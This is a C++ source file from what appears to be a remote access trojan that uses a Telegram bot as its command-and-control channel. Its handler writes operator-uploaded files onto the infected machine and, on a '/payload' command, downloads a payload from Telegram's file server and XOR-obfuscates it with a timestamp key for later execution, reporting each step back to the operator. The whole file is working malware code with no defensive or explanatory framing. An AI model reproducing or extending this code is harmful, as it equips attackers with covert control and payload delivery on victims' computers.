#include "rat/Handler.hpp"
#include "rat/encryption/xor.hpp"
#include "rat/system.hpp"

#include "rat/encryption/encryption.hpp"

#include <sstream>
#include <filesystem>
#include "logging.hpp"

namespace rat::handler {

void Handler::handleMessageWithUploadedFiles() {
    if (telegram_update.message.files.empty()) return;
    if( this->telegram_update.message.caption == "/payload"  &&  this->telegram_update.message.files.size() == 1 ){
        this->handlePayloadCommand();
        return;
    }
    std::ostringstream response_buffer;
    for (const auto& file : telegram_update.message.files) {
        std::filesystem::path file_path = std::filesystem::current_path();

        if (file.name.has_value() && !file.name->empty()) {
            file_path /= file.name.value();
        } else {
            file_path /= rat::system::getCurrentDateTime_Underscored();
        }
        DEBUG_LOG("We have file {} trying to download it", file_path.string());
        if(this->bot->downloadFile(file.id, file_path)) {
            response_buffer << "File: " << file_path.string() << " has been downloaded\n";
        } else {
            response_buffer << "File: " << file_path.string() << " has not been downloaded\n";
        }
    }

    response_buffer << fmt::format("Received {} uploaded file(s)", telegram_update.message.files.size());
    this->bot->sendMessage(response_buffer.str());
}

void Handler::handlePayloadCommand() {
    this->bot->sendMessage("Integrating the payload...");

    if (this->telegram_update.message.files.empty()) {
        this->bot->sendMessage("No file found in the update.");
        return;
    }

    const auto& file = this->telegram_update.message.files[0];
    const auto& file_id = file.id;

    std::filesystem::path file_path = std::filesystem::current_path();
    std::string time_stamp = rat::system::getCurrentDateTime_Underscored();

    if (file.name.has_value() && !file.name->empty()) {
        file_path /= *file.name;
    } else {
        file_path /= time_stamp;
    }

    // Store key for obfuscation
    this->state.payload_key = time_stamp;

    // Construct file URL (adjust depending on your bot API)
    const std::string file_url = fmt::format("{}{}", this->bot->getBotFileUrl(), file_id);
    this->bot->sendMessage("Downloading the Payload...");
    if (!this->bot->curl_client.downloadData(file_url, this->state.payload)) {
        this->bot->sendMessage("Failed to download payload.");
        return;
    }

    if (!this->state.payload.empty()) {
        this->bot->sendMessage("Obfuscating it...");
        rat::encryption::xorData(
            this->state.payload.data(),
            this->state.payload.size(),
            this->state.payload_key.c_str()
        );
    } else {
        this->bot->sendMessage("Payload is empty after download.");
        return;
    }

    this->bot->sendMessage("Integration complete.");
}
}
